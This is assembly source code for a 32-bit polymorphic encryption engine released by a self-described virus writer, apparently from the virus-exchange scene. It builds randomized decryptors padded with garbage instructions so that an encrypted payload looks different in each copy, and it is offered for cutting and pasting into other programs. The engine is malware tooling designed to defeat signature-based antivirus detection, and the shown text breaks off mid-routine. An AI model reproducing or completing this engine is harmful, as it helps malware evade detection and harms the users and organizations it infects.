.386
locals
jumps
.model flat,STDCALL

public v32p

org 0  
.data                                 
db 	'__Virogen''s 32bit Polymorphic Engine__',0
.code    
start:
; DLLMain
	pop	eax
	add	esp,12
	push	eax
	mov	eax,1
	ret

include	v32p.inc
;--------------------------------------------------------------------
; Virogen's 32-bit Polymorphism (V32P) Vrsion 0.06 Alpha
;						  
;
; ***IMPORTANT NOTE**
; This polymorphic engine isn't finished, but since it's been
; laying around my hard drive for about a year, I figured I'd go
; and release it to the public as is and release subsequent updates.
; Expect many more versions, with more power in each. Version 1.0 
; will be the final release.
; *******************
;
; This is a real polymorphic engine; 100% polymorphism with large
; variations in the decryptor type, size, functioning, instruction, and
; register usage. I have distributed this verison in DLL format, but
; the v32p procedure is self-contained so you can easily cut&paste it
; into your application; all I ask for is a greet and perhaps an email<g>.
; Be sure to change the flags of the object that contains v32p to +w,
; as v32p data is stored along with the code.
;
; I must take this opportunity to apologize for any messy code in 
; v32p; as the months went by with an addition here and no care 
; towards clean code, things may have gotten messy. Optimization
; and code cleanup will be a priority in subsequent versions. Believe
; or not though, v32p does have a nice organization which allows for
; easy expandability (well, I think so anyway<g>).
;
;
; Features:
;  +100% polymorphic. This may be the most powerful 32bit polymorphic 
;   engine released to date.
;  +Win32 compatible.
;  +support for relocations (displacement caused by decryptor added)
;
; Prototype:
;
; DWORD v32p(DWORD lpSrc, DWORD lpDest, DWORD lpLoadAddress, 
;            DWORD CodeSize, DWORD lpRelocs, DWORD RelocKey, 
;	     DWORD GarbagePerIteration, DWORD lpGetTickCount, 
;	     DWORD ForceSize, DWORD Flags);
; 
;  lpSrc 	= pointer to the source of the code to encrypt
;  lpDest 	= destination of polymorphic decryptor+encrypted code
;  lpLoadAddress = address where polymorphic decryptor will execute from
;  CodeSize 	= size of the code to encrypt
;  lpRelocs 	= pointer to the relocation table. Use NULL if n/a.
;  RelocKey 	= key to use for encrypted relocations. Use NULL if n/a.
;  GarbagePerIteration = number of garbage instructions per call to the 
;		  garbage code generator. This field, with garbage turned
;		  on, has a great impact on the final size of the decryptor.
;  lpGetTickCount = address of GetTickCount kernel32 API.
;  ForceSize 	= if decryptor must be a certain size, pass it here.
;  Flags 	= any combination of the following flags:
;	PRESERVE_FLAGS_REGISTERS equ 0000000000000001b
;          this flag indicates to prefix the polymorphic decryptor with
;          a PUSHAD followed by a PUSHFD. The responsibility to POPFD/POPAD
;          is left up to the encrypted code.
;	DISABLE_CALLS	         equ 0000000000000010b
;          Toggle to turn on CALLs in polymorphic decryptor garbage code.
;       DISABLE_JMPS		 equ 0000000000000100b
; 	   Toggle to turn off JMPS in polymorphic decryptor garbage code.
;       NO_GARBAGE		 equ 0000000000001000b
;	   Turns off garbage code.
;
; Returns:
;  V32P returns the size of the polymorphic decryptor, not including the
;  encrypted code following it.
;
;
; Relocation Table:
;  lpRelocs points to a relocation table with the following format:
;    dd pEncryptedRelocs (start of encrypted relocations in the table)
;    dd reloc1,reloc2,....
;  Each address in the relocation table has the end size of the polymorphic
;  decryptor added to it. Encrypted relocations are first XORed by
;  RelocKey, then have the polymorphic decryptor size added, then are XORed
;  again by RelocKey. Note this encryption/decryption applies to the data
;  pointed to by the relocation address, not the relocation address itself.
;
;
;					latez
;					Virogen/NOP/PC
;					http://virogen.cjb.net
;					http://www.virusexchange.org/nop
;
;  
;  to do: 
;          finish big jmp variations - add OR to cmp reg,0
; 	   finish esp adjustment variations after call
;
;
;
_eax equ 0                      ; this is the order of registers
_ecx equ 1                      ; in their corresponding opcode calculations
_edx equ 2
_ebx equ 3
_esp equ 4
_ebp equ 5
_esi equ 6
_edi equ 7

_byte equ 0                     ; our bit count designators
_word equ 1
_dword equ 2

preg dd -1                                       ; register used in ptr
;kreg dd -1                                       ; register used for key
lreg dd -1                                       ; register used for load
creg dd -1                                       ; register used for counter

crypt_size db _dword                            ; cryptor size, 8|16|32
force_dw db 0                                   ; 1=force dword usage
force_w  db 0					; 1=force word usage

max_rnd equ 0fffffffeh

_dec     db 48h                                 ; base for dec reg
_inc     db 40h                                 ; base for inc reg                              
_xor_p_v dw 3080h                               ; base for xor ptr,byte
         dw 3081h                               ; base for xor ptr,word
         dw 3081h                               ; base for xor ptr,dword
_add_p_v dw 0080h                               ; base for add dword ptr
         dw 0081h
         dw 0081h
_sub_p_v dw 2880h                               ; base for sub dword ptr
         dw 2881h
         dw 2881h
_loop    db 0E2h                                ; loop
_jnz     db 75h                                 ; jnz
_jns     db 79h                                 ; jns 
_jz      db 74h                                 ; jz 
_jnc     db 73h                                 ; jnc 
_jmp     db 0E9h                                ; jmp 
_jmpreg  dw 0E0FFh                              ; jmp reg32
_call	 db 0E8h				; call
_pop	 db 058h				; pop reg32
_mov_r   dw 0C08Bh                              ; base for mov reg1,reg2
_xor_r   dw 0C033h                              ; base for xor reg1,reg2
_sub_r   dw 0C02Bh                              ; base for sub reg1,reg2
_add_r   dw 0C003h                              ; base for add reg1,reg2
_cmp_r   dw 0C03Bh                              ; base for cmp reg1,reg2
_lod_r   dw 008Bh                               ; base for mov reg1,[reg2]
_sto_r   dw 0089h                               ; base for mov [reg1],reg2
_add_tbl dw 0C080h                              ; base for add reg,byte
         dw 0C081h                              ; base for add reg,word
         dw 0C081h                              ; base for add reg,dword
_sub_tbl dw 0E880h                              ; base for sub reg,byte
         dw 0E881h                              ; base for sub reg,word
         dw 0E881h                              ; base for sub reg,dword
_mov_tbl dw 0B090h                              ; base for mov reg,byte
         dw 0B866h                              ; base for mov reg,word
         dw 0B890h                              ; base for mov reg,dword
_cmp_tbl dw 0F880h                              ; base for cmp reg,byte 
         dw 8266h                               ; base for cmp reg,word 
         dw 0F881h                              ; base for cmp reg,dword
_xor_tbl dw 0F080h                              ; base for xor reg,byte
         dw 0F081h                              ; base for xor reg,word
         dw 0F081h                              ; base for xor reg,dword
_or_tbl	 dw 0C880h         
	 dw 0C881h
	 dw 0C881h	 
_test_tbl dw 0C0F6h
	 dw 0C0F7h
	 dw 0C0F7h
_and_tbl dw 0E080h	 	
	 dw 0E081h
	 dw 0E081h 
         
_pushad	 db 60h
_pushfd  db 9ch         
one_byte_misc_ops:
	 sti
	 cld
	 nop	 
one_byte_misc_ops_ends:	 
	 
codesize dd 0                                   ; code size parameter
decryptptr dd 0                                 ; decryption ptr save
dest     dd 0                                   ; destination for decrypt+code
src      dd 0                                   ; source of code to encrypt

rndizer dd 0                                    ; for random # generator

pkey        dd 12345678h                        ; key for encryption
total_dsize dd 0                                ; size of decryptor
loop_dest   dd 0                                ; destination for our loop
idxptr      dd 0                                ; ptr to our set idx operand
crypt_type  db 0                                ; cryptor type
reloc_table dd 0				; address of relocation table


gbg_on 	    db 1
gbg_off:
size_specifier dd 0

negidx      db 0                                ; negative idx flag

GetTickCountAddr dd 0
reloc_key   dd 0
Flags	    dd 0
g_per_iter  dd 75

v32p proc ;lpSrc:DWORD, lpDest:DWORD, lpLoadAddress:DWORD, CodeSize:DWORD, lpRelocs:DWORD, lpRelocKey:DWORD, lpGetTickCount:DWORD, ForceSize:DWORD, Flags:DWORD   
   	call	calculate_delta
calculate_delta:
	pop	ebp
	sub	ebp,offset calculate_delta

; DWORD v32p(DWORD lpSrc, DWORD lpDest, DWORD lpLoadAddress, 
;            DWORD CodeSize, DWORD lpRelocs, DWORD lpRelocKey, 
;	     DWORD lpGetTickCount, DWORD ForceSize, DWORD Flags);
	   	
   	mov	eax,[esp+4]
   	mov	[ebp+src],eax
   	mov	esi,eax
   	mov	eax,[esp+8]
   	mov	[ebp+dest],eax
   	mov	edi,eax
   	mov	eax,[esp+12]
   	mov	[ebp+decryptptr],eax
	mov	ecx,[esp+16]   	
   	mov	eax,[esp+20]
   	mov	[ebp+reloc_table],eax   
   	mov	eax,[esp+24]
   	mov	[ebp+reloc_key],eax	
   	mov	eax,[esp+28];
   	mov	[ebp+g_per_iter],eax
   	mov	eax,[esp+32]
   	mov	[ebp+GetTickCountAddr],eax
   	mov	eax,[esp+36]
   	mov	[ebp+size_specifier],eax   	
    	mov	eax,[esp+40]
  	mov	[ebp+Flags],eax
   	   	   	
   	push 	ecx                                     ; save code size
   	mov	eax,_dword                               ; default to dword key
;   	cmp 	bl,0                                    ; if 0, then screw this
;   	jz 	no_key
ag_key:
   	call 	rndsize
   	mov	ecx,edx                                  ; test ecx size
   	call 	test_bits                               ; get size in ax
   	xchg 	ecx,ebx
no_key:        
   	mov 	[ebp+pkey],ebx

   	cmp 	ax,_dword
   	jz	not_c_borw
   	inc 	al                                       ; _byte|_word+1=1|2
   	jmp 	c_set
not_c_borw:
   	add 	al,2                                     ; _dword+2=4
c_set:
   	mov 	[ebp+crypt_size],al                      ; save crypt size            
   
   	;cmp	[ebp+size_specifier],0
   	;jz	no_force_byte
   	;mov	[ebp+crypt_size],1
; placing of pushad/pushfd for register/flag preservation   
	test	[ebp+Flags],PRESERVE_FLAGS_REGISTERS
	jz	no_preserve
   	push	eax
   	mov	al,_pushad
   	stosb
   	mov	al,_pushfd
   	stosb
   	pop	eax
no_preserve:   	
no_force_byte:   
   	xchg 	ecx,eax                                 ; cx=crypt_size type
   	pop 	eax                                      ; restore code size
   	xor	edx,edx	
   	div 	ecx                                       ; find count accd. to size
   	inc 	eax
   	mov 	[ebp+codesize],eax                       ; save code size in b|w|dw

   	cmp 	[ebp+pkey],0                              ; no key?
   	jnz 	getp
   	push 	0
   	push 	0                                       ; no decryptor if no key
   	jmp 	copy_and_crypt

getp:
   	call	get_reg              ; get pointer register
   	cmp 	edx,_ebp              ; don't use ebp, different size op
   	jz 	getp
   	mov 	[ebp+preg],edx           
force_cnt_std_reg:   
   	call 	get_reg              ; get counter register      
; todo:temp fix - ebp,esi,edi not allowed for counter register
; test for non-byte accessible registers (esi,edi,ebp)   
   	cmp	edx,_ebp
   	jae 	force_cnt_std_reg
   	mov 	[ebp+creg],edx           
   	call 	select_lreg          ; get a good lreg
   	mov 	[ebp+lreg],edx
   
   	call 	garbage_code
   	mov 	ebx,[ebp+creg]                           ; get the count register
   	mov 	edx,[ebp+codesize]                       ; get code size
   	call 	mov_master                              ; make a functional mov

   	call 	garbage_code
   	mov 	ebx,[ebp+preg]
   	mov 	edx,[ebp+decryptptr]                     ; loadup decryptor ptr
   	call 	mov_master

   	mov 	[ebp+negidx],al                          ; if we used sub then flag
   	mov 	eax,edi
   	sub 	eax,4
   	mov 	[ebp+idxptr],eax                         ; save so we can adjust later

   	call 	calc_dsize                              ; find the decryptor size
   	mov 	[ebp+loop_dest],ecx                      ; save loop destination
   
   	call 	garbage_code
   	mov 	ebx,[ebp+preg]
   	mov 	edx,[ebp+pkey]
   	call 	crypt_master                            ; chose and write cryptor

   	call 	garbage_code
   	mov 	eax,_byte
   	mov 	ebx,[ebp+preg]
   	xor 	ecx,ecx                                  
   	mov 	cl,[ebp+crypt_size]                      ; load crypt size type
   	mov 	[ebp+force_dw],1
   	call 	add_master                              ; adjust ptr
   	mov 	[ebp+force_dw],0
   
   	call 	garbage_code
   	call 	calc_dsize
   	xchg 	ebx,ecx
   	mov 	edx,[ebp+loop_dest]
   	call 	loop_master
   
   	call 	calc_dsize                              ; we need to fix the idx
   	xor	ebx,ebx
   	mov 	bl,byte ptr [ebp+size_specifier]
   	or	bl,bl
   	jz	no_padding
   	sub	ebx,ecx
   	xchg	ebx,ecx
   	mov  	al,90h
   	rep	stosb
   	call 	calc_dsize
      
no_padding:      	
   	push 	ecx ecx                                 ; save 'em for below
   	add 	ecx,[ebp+decryptptr]                     ; now that we know how big
   	mov 	edi,[ebp+idxptr]                         ; the decryptor is
   	cmp 	byte ptr [ebp+negidx],1                  ; did we use negative idx?
   	jnz 	reg_idx
   	xchg 	ecx,eax
   	xor 	ecx,ecx
   	sub 	ecx,eax                  
reg_idx:
   	xchg 	ecx,eax
   	stosd                                       ; save it

; handle relocations
   	pop	ecx
   	push	ecx
   	pushad
   	mov	esi,[ebp+reloc_table]      
   	or	esi,esi
   	jz	reloc_done
   	lodsd
   	xchg	eax,ebx
   	lodsd
   	xchg	eax,edx
reloc_loop:
   	mov	edi,[ebp+src]         
   	lodsd
   	or	eax,eax
   	jz	reloc_done      
   	add	edi,eax   
   	call	test_reloc_decrypt   	
   	add	dword ptr [edi],ecx      	
   	call	test_reloc_decrypt
   	jmp	reloc_loop
reloc_done:         
   	popad
   
   ; this is where we encrypt and copy the code to our buffer
copy_and_crypt:
   	mov 	esi,[ebp+src]
   	pop 	ecx                                      ; restore decryptor size
   	mov 	edi,[ebp+dest]                           ; get ptr to decryptor
   	add 	edi,ecx                                  ; store crypted code after
   	mov 	ebx,[ebp+pkey]
   	push	ebx
   	mov 	ecx,[ebp+codesize]
   	call 	encrypt
   
   	pop	edx
   	pop 	eax                              ; restore decryptor size   	   	   	   	
   	ret	40

encrypt:
   	mov 	dl,[ebp+crypt_size]
   	cmp 	dl,4
   	jz 	load_dw
   	cmp 	dl,2
   	jz 	load_w
load_b:
   	lodsb
   	call 	encrypt_byte
   	stosb
   	loop 	load_b
   	ret
load_w:
   	lodsw
   	call 	encrypt_word
   	stosw
   	loop 	load_w
   	ret
load_dw:
   	lodsd
   	call 	encrypt_dword
   	stosd
   	loop 	load_dw
   	ret

encrypt_byte:
   	mov 	dl,[ebp+crypt_type]
   	cmp 	dl,_xor
   	jz 	xorit
   	cmp	dl,_lxor
   	jz 	xorit
   	cmp 	dl,_sub
   	jz 	addit
   	cmp 	dl,_lsub
   	jz 	addit
subit:
   	sub 	al,bl
   	ret
addit:
   	add 	al,bl
   	ret
xorit:
   	xor 	al,bl
   	ret

encrypt_word:
   	mov	dl,[ebp+crypt_type]
   	cmp	dl,_xor
   	jz	xoritw
   	cmp	dl,_lxor
   	jz	xoritw
   	cmp	dl,_sub
   	jz	additw
   	cmp	dl,_lsub
   	jz	additw
subitw:
   	sub	ax,bx
   	ret
additw:
   	add	ax,bx
   	ret
xoritw:
   	xor	ax,bx
   	ret

encrypt_dword:
   	mov	dl,[ebp+crypt_type]
   	cmp	dl,_xor
   	jz 	xoritdw
   	cmp	dl,_lxor
   	jz	xoritdw
   	cmp	dl,_sub
   	jz	additdw
   	cmp	dl,_lsub
   	jz	additdw
subitdw:
   	sub	eax,ebx
   	ret
additdw:
   	add	eax,ebx
   	ret
xoritdw:
   	xor	eax,ebx
   	ret

;------------------------------------------------------
; calc_dsize
;   returns: ecx=size of decryptor so far 
;
calc_dsize:

   	mov 		eax,[ebp+dest]
   	mov 		ecx,edi
   	sub 		ecx,eax                  
   	ret 
;    
;-------------------------------------------------------
; fixup a reg1,reg2 operand to reg2
;  on entry:
;    edx=operand
;    ebx=reg2
;
fix_to_reg:
   	push 	ebx
   	xchg 	eax,ebx                           ; eax=register
   	mov 	ecx,8                             
   	push 	edx                               ; save edx
   	xor 	edx,edx                          
   	mul 	ecx                                ; * 8
   	pop 	edx                                ; restore edx
   	add 	dh,al
   	pop 	ebx
   	ret

;-----------------------------------------------------------
; loop_master - creates a functional loop and decrements the
;               count register 
;      on entry:
;       ebx=source eip
;       edx=destination eip
;
_j_loop equ 0
_j_jnz  equ 1
_j_jns  equ 2
_j_jz   equ 3 ; move to big jumps
_bigjmp equ 3
_jmpr   equ 2
_jmpret equ 1 ; need to implement

loop_master:
	push 	edx
    	call 	is_cond_jmp_too_big            ; jmp too big?
    	jc 	use_big_jmps    
;    jnc lmr
;get_big_again:                          ; we must have big jump
;    mov ecx,_j_jz                       
;    call rndnum
;    cmp edx,_jz
;    jl get_big_again
;    jmp use_big_jmps
lmr:    
    	mov 	ecx,_j_jz                     
    	call 	rndnum
    	cmp 	edx,_j_loop
    	jnz 	not_loop
    	cmp 	[ebp+creg],_ecx                       ; we only use loop on ecx
    	jnz 	lmr
    	lea 	esi,[ebp+_loop]
    	jmp	do_loop_no_dec
not_loop:
    	cmp 	edx,_j_jnz
    	jnz 	not_jnz
    	lea 	esi,[ebp+_jnz]
    	jmp 	do_loop
not_jnz:
	cmp 	edx,_j_jns
    	jnz 	not_jns
    	lea 	esi,[ebp+_jns]
    	jmp 	do_loop
not_jns:
	;cmp 	edx,_j_jz
	;jnz 	not_jz
     	jmp 	use_big_jmps
do_loop:
    	mov 	ebx,[ebp+creg]
    	call 	asm_dec
;    pop ebx
;    inc ebx                            ; source eip needs to account for dec
;    push ebx
do_loop_no_dec:
    	call 	calc_dsize                     ; find source eip
    	mov 	ebx,ecx
    	pop 	edx
    	call 	asm_cond_jmp
    	ret

use_big_jmps:
    ;cmp edx,_jz
    ;jnz not_jz
    	mov 	ebx,[ebp+creg]          ; decrement counter
    	call 	asm_dec
    	mov 	ebx,[ebp+creg]
    	xor 	ecx,ecx
    	call 	asm_cmp_v              ; cmp creg,0
    	mov 	ecx,_bigjmp
    	call	rndnum
    	cmp 	edx,_bigjmp
    	jnz 	not_bigjmp    
    	mov 	ecx,5
    	call 	asm_jz
    	call 	calc_dsize
    	mov 	ebx,ecx
    	pop 	edx
    	call 	asm_jmp
    	jmp 	done_jmp
not_bigjmp:                                   ; mov reg,address
;    cmp edx,_jmpr                            ; jmp reg
;    jnz not_jmpr
    	mov 	ecx,7
    	call 	asm_jz
    	mov 	ecx,2
    	call 	get_reg    
    	pop 	ecx                                     ; ecx=destination
    	add 	ecx,[ebp+decryptptr]                   ; add base        
    	xchg 	edx,ebx                                ; ebx=reg
    	push 	ebx
    	call 	asm_mov_v
    	pop 	ebx
    	call 	asm_jmp_reg
not_jmpreg:
done_jmp:  
	ret

; entry: ecx=bytes to conditionally jmp over
asm_jz:
    	xor 	ebx,ebx
    	mov 	edx,2                   ; jz size+jmp size
    	add 	edx,ecx
    	lea 	esi,[ebp+_jz]
    	call 	asm_cond_jmp           ; JZ $+3
    	ret


;--------------------------------------------------------------
; assembles JMP far reg
;  entry:ebx=register
;
asm_jmp_reg:
    	lea 	esi,[ebp+_jmpreg]
    	lodsw
    	add 	ah,bl                     ; adjust to reg
    	stosw
    	ret

;--------------------------------------------------------------
; assemble JMP or CALL
;   ebx=source
;   edx=destination
;
;
asm_call:
    	mov 	al,[ebp+_call]
    	jmp 	asm_branch
asm_jmp:
	mov 	al,[ebp+_jmp]           ; get jmp opcode	
asm_branch:
    	add 	ebx,5                   ; operand size
    	sub 	edx,ebx    
    	stosb                       ; write instruction
    	mov 	eax,edx                 
    	stosw                       ; write low word
    	rol 	eax,16
    	stosw                       ; write high word
    	ret


;--------------------------------------------------------------
; test if conditional jmp is too big
;  entry: ebx=source
;         edx=destination
;  returns: carry if true       
; 

is_cond_jmp_too_big:
    	add	ebx,2
    	sub 	ebx,edx ; just to see how big the jmp is
    	cmp 	ebx,127
    	jg 		is_too_big
    	clc
    	ret
is_too_big:   
    	stc
    	ret
        
;------------------------------------------------------------
; load_reg - load reg1 from [reg2]
; 
load_reg:
      
     	mov 	edx,[ebp+preg]        ; get index pointer
     	mov 	ebx,[ebp+lreg]
     	call	asm_lod_r            ; make/write operand
     	ret  

;------------------------------------------------------------
; store_reg - stores reg1 to [reg2]
;
store_reg:
     	mov 	ebx,[ebp+lreg]
     	mov 	edx,[ebp+preg]
     	call 	asm_sto_r
     	ret

;------------------------------------------------------------
; crypt_master - chose crypt type and write the operand
;   on entry:
;      ebx=reg
;      edx=key
;
_xor equ 0     ; direct cryption (already defined)
_sub equ 1
_add equ 2
_lxor equ 3     ; indirect cryption
_lsub equ 4
_ladd equ 5
crypt_master:
       push 	ebx edx
       mov 	ecx,_ladd                       ; pick a cryption type at rnd
       call 	rndnum
       mov 	byte ptr [ebp+crypt_type],dl   ; save method chosen
       cmp 	edx,_xor
       jnz 	not_xor
       lea 	esi,[ebp+_xor_p_v]
       jmp 	make_crypt
not_xor:
       cmp 	edx,_sub
       jnz 	not_sub
       lea 	esi,[ebp+_sub_p_v]
       jmp 	make_crypt
not_sub:
       cmp 	edx,_add
       jnz 	not_add
       lea 	esi,[ebp+_add_p_v]
make_crypt:
       pop 	edx ebx
       mov 	[ebp+lreg],-1                ; we don't need load reg /w these
       call 	asm_do_d_v                  ; make direct crypt operand
       ret

not_add:                                ; indirect cryptions
       push 	edx
       call 	load_reg                    ; loadup register
       pop 	edx
       cmp 	edx,_lxor
       jnz 	not_lxor
       call 	cond_garbage_code       
       pop 	ecx ebx
       mov 	ebx,[ebp+lreg]       
       call 	asm_xor_v
       jmp 	finish_lod
not_lxor:
       cmp 	edx,_lsub
       jnz 	not_lsub
       pop 	ecx ebx
       mov 	ebx,[ebp+lreg]
       call 	asm_sub_v
       jmp 	finish_lod
not_lsub:
;       cmp edx,_ladd
;       jnz not_ladd
       pop 	ecx ebx
       mov 	ebx,[ebp+lreg]
       call 	asm_add_v
finish_lod:
       call 	store_reg
       ret

;------------------------------------------------------------
; Jxx assembler - assembles a type of 2byte conditional jmp
;   esi->jump operand
;   ebx=offset of current eip
;   edx=offset of destination eip
;
asm_cond_jmp:   
   	add 	bl,2                     ; Jxx op is two bytes
   	sub 	dl,bl                    ; find difference
   	mov 	al,[esi]                 ; loadup Jxx operand
   	mov 	ah,dl                    ; loadup difference   
   	stosw                        ; save the op
   	ret

;-------------------------------------------------------
; XOR/ADD/SUB dword [ptr],value assembler
;   esi->operand
;   ebx=reg
;   edx=value
;   
;
asm_do_d_v:     
     	push 	ebx edx
     	xchg 	ecx,edx
     	call 	prefix_op
     	pop 	edx ebx
     	add 	ah,bl                                  ; set to our register
     	cmp 	ebx,_ebp                               ; if it's ebp,esi,or edi
     	jl 	not_xtd                                 ; then we've got to make
     	add 	ah,40h                                 ; a different operand
     	stosw
     	xor 	ax,ax                                  ; store 0 index
     	stosb
     	jmp finish_d_v
not_xtd:
     	stosw                                      ; save operand
finish_d_v:
     	xchg 	edx,ecx
     	call 	write_value                           ; store value

     ret

;-------------------------------------------------------
; add_master - creates a functional addition of register
;   on entry:
;     ebx=register
;     ecx=value to add
;
_add_a equ 0
_sub_a equ 1
_dec_a equ 2
add_master:
  	push 	ecx
  	mov 	ecx,_dec_a
  	call 	rndnum
  	pop 	ecx
  	cmp 	edx,_add_a
  	jnz 	not_add_a
  	xchg 	ecx,edx
  	mov 	ecx,0
  	sub 	ecx,edx
  	call	asm_sub_v
  	ret
not_add_a:
  	cmp 	edx,_sub_a
  	jnz 	not_sub_a
  	call 	asm_add_v
  	ret
not_sub_a:
inc_loop: 
  	call 	asm_inc
  	call 	cond_garbage_code
  	loop 	inc_loop
  
  ret

cond_garbage_code:
	cmp 	gbg_on[ebp],1
     	jnz 	no_gbg_on1
     	call	 garbage_code
no_gbg_on1:    
     	ret
  
;--------------------------------------------------------
; write_value - writes a specified value according to it's bit count
;   on entry: ecx=value
;
write_value:     
     	call 	test_bits
     	xchg 	eax,ecx
     	cmp 	[ebp+force_dw],1
     	jz 	write_dword
     	cmp 	ecx,_byte
     	jz	write_byte
     	cmp 	ecx,_word
     	jz 	write_word
write_dword:
     	stosd
     	ret
write_word:
     	stosw
     	ret
write_byte:
     	stosb
     	ret

;-------------------------------------------------------
; zero_reg - creates a functional nulling of a register
;    on entry:
;      ebx=register
;
; zero_reg variations - xor reg,reg | sub reg,reg | mov reg, 0 
;                                                    
;                                                   
;
_z_xor equ 0
_z_sub equ 1
_z_mov equ 2

zero_reg:
   	mov 	ecx,_z_mov
   	call 	rndnum
   	cmp 	edx,_z_xor
   	jnz 	not_z_xor
   	mov 	edx,ebx                                  ; reg1=reg2
   	call	asm_xor_r                               ; xor reg,reg
   	ret
not_z_xor:
   	cmp 	edx,_z_sub
   	jnz 	not_z_sub
   	mov 	edx,ebx                                  ; reg1=reg2
   	call 	asm_sub_r                               ; sub reg,reg
   	ret
not_z_sub:
   	xor 	ecx,ecx
   	call 	asm_mov_v
   	ret


;-------------------------------------------------------
; creates a functional mov using a random style;
;   ebx=destination register
;   edx=value
;
;  returns: eax=1 if sub used
;
;  variations - mov reg,value  |   zero_reg (see variations)
;                                            add reg,value  | sub reg,value
;
_mov_m equ 0
_mov_a equ 1
_mov_s equ 2
mov_master:
   	push 	edx
   	mov 	ecx,_mov_s
   	call 	rndnum
   	cmp 	edx,_mov_m
   	jnz 	not_mov_m
   	xchg 	ecx,edx
   	call 	test_bits
   	cmp 	eax,_dword
   	jnz 	fixme_not
   	call 	zero_reg
fixme_not:
   	pop 	ecx
   	call 	asm_mov_v
   	xor 	eax,eax
   	ret
not_mov_m:   
   	push 	edx
   	call 	zero_reg                        ; first we zero the register
   	pop 	edx
   	cmp 	edx,_mov_a
   	jnz 	not_mov_a
   	pop 	ecx                              ; restore value
   	call 	asm_add_v
   	xor 	eax,eax
   	ret   
not_mov_a:
;	cmp edx,_mov_s
;	jnz not_mov_s
   	pop 	edx                              ; get value
   	xor 	ecx,ecx
   	sub 	ecx,edx                          ; fixit up for sub from 0f   
   	call 	asm_sub_v   
   	mov 	eax,1
   	ret


asm_sto_r:
   	lea 	esi,[ebp+_sto_r]
   	jmp 	asm_reg_r
asm_lod_r:
   	lea 	esi,[ebp+_lod_r]
   	jmp 	asm_reg_r
asm_mov_r:
   	lea 	esi,[ebp+_mov_r]
   	jmp 	asm_reg_r
asm_sub_r:
   	lea 	esi,[ebp+_sub_r]
   	jmp 	asm_reg_r
asm_xor_r:
   	lea 	esi,[ebp+_xor_r]
   	jmp 	asm_reg_r
asm_cmp_r:
   	lea 	esi,[ebp+_cmp_r]
   	jmp 	asm_reg_r
asm_add_r:
   	lea 	esi,[ebp+_add_r]

;--------------------------------------------------------
; assembles reg,reg operands - MOV,ADD,SUB,XOR
;  ebx=reg2
;  edx=reg1
;  esi->operand
;
asm_reg_r:
   	lodsw                ; get the operand
   	xchg 	eax,edx         ; put op in edx
   	push 	eax
   	call 	fix_to_reg      ; fix it up
   	pop 	eax
   	add 	dh,al            ; fixup reg 1
   	xchg 	eax,edx         
   	stosw                ; save the operand
   	ret


asm_xor_v:
   	lea 	esi,[ebp+_xor_tbl]
   	jmp 	asm_op2
asm_or_v:
   	lea 	esi,[ebp+_or_tbl]
   	jmp 	asm_op2   
asm_and_v:
   	lea 	esi,[ebp+_and_tbl]
   	jmp 	asm_op2
asm_test_v:
   	lea 	esi,[ebp+_test_tbl]
   	jmp 	asm_op2   
asm_cmp_v:
   	;or 	ecx,ecx				; comparing to 0?
   	;jnz 	non_zero_compare
      					; if so randomly select or reg,reg instead
   					; of cmp reg,0
   	;push 	ebx ecx   
   	;pop 	ecx ebx   					
non_zero_compare:      
   	lea 	esi,[ebp+_cmp_tbl]
   	jmp 	asm_op2
asm_mov_v:
   	lea 	esi,[ebp+_mov_tbl]
   	mov 	edx,1                            ; base of operand is 1 byte
   	jmp 	asm_reg_v
asm_add_v:
   	lea 	esi,[ebp+_add_tbl]
   	jmp 	asm_op2
asm_sub_v:
   	lea 	esi,[ebp+_sub_tbl]
asm_op2:         
   	mov 	edx,2                            ; 2 bytes for add,sub,cmp
;------------------------------------------------------------
; assembles reg,val operands - ADD,SUB,MOV,CMP
;
;  on entry:
;    ebx=reg1
;    ecx=value
;    esi->opcode structure
;
;
asm_reg_v:
   	call 	prefix_op     
   	add 	ah,bl                          ; fix to our register
   	call 	write_op
   	call 	write_value
   	ret

;---------------------------------------------------------------
; prefix_op - setup operand for 8|16|32bit
;
;   entry: esi->opcode structure
;          ecx=value
;   returns: ax=operand
;
prefix_op:
   	cmp 	[ebp+force_dw],1                         
   	jz 	not_sword                         ; forcing dword usage?
   	call 	test_bits                       ; get bit count
   	cmp 	eax,_byte
   	jnz 	not_sbyte
   	mov 	ax,word ptr [esi+(_byte*2)]
  	ret
not_sbyte:
   	cmp 	[ebp+force_w],1			; forcing word usage?
   	jz 	is_sword   
   	cmp 	eax,_word
   	jnz 	not_sword
is_sword:   
   	mov 	al,66h                          ; prefix for word operand
   	stosb   
   	mov	ax,word ptr [esi+(_word*2)]
   	ret
not_sword:
   	mov	ax,word ptr [esi+(_dword*2)]
   	ret

;---------------------------------------------------------------
; write_op 
;   eax=operand
;   edx=operand size
;
;
write_op:  
  	push 	ecx  
  	xchg 	edx,ecx  
  	cmp 	ecx,1
  	jnz 	wo_loop
  	ror 	eax,8
wo_loop:
  	stosb
  	ror 	eax,8
  	loop 	wo_loop
  	pop 	ecx
  	ret

asm_inc:
   	mov 	al,[ebp+_inc]
   	jmp 	asm_incdec
asm_dec:
   	mov 	al,[ebp+_dec]
;---------------------------------------------------------------
; INC reg or DEC reg
;  on entry:
;    ebx=reg
;
asm_incdec:
   	add	al,bl
   	stosb
   	ret

;-----------------------------------------------------------
; Create random amount of garbage code
;      
;
max_jmp_size equ 30h                    ; maximum jmp size
max_call_size equ 30h
_gmov equ 0
_gadd equ 1
_gsub equ 2
_gxor equ 3
_gcmp equ 4
_ginc equ 5
_gdec equ 6
_gmovr equ 7
_gaddr equ 8
_gsubr equ 9
_gxorr equ 10
_gcmpr equ 11
_gmovrr equ 12
_gcmprr equ 13
_gaddrr equ 14
_gsubrr equ 15
_gone equ 16
_gjmp equ 17
_gcall equ 18
_gor  equ 19
_gand equ 20
_gtest equ 21
garbage_code:				
	cmp	Flags[ebp],NO_GARBAGE
	jz	gbg_ret
	cmp 	byte ptr gbg_off[ebp],0
        jz 	gbg_good
gbg_ret:        
        ret
gbg_good:        
        push 	eax ebx ecx edx 
        mov 	gbg_on[ebp],0
	mov 	ecx,g_per_iter[ebp]
        call 	rndnum                     ; figure how much we're gonna write
        xchg 	edx,ecx                
garbage_loop:        
        push 	ecx
        mov 	ecx,_gtest	; highest garbage type        
        call 	rndnum        
        		
        cmp 	dx,_gmov
        jnz 	not_gmov                
        call 	setup_gbg_v
        xchg 	ecx,edx
        call 	mov_master         
        jmp 	one_gbg_done
not_gmov:
        cmp 	dx,_gadd
        jnz 	not_gadd
        call 	setup_gbg_v
        call 	asm_add_v
        cmp 	dx,_gadd
        jnz 	not_gadd
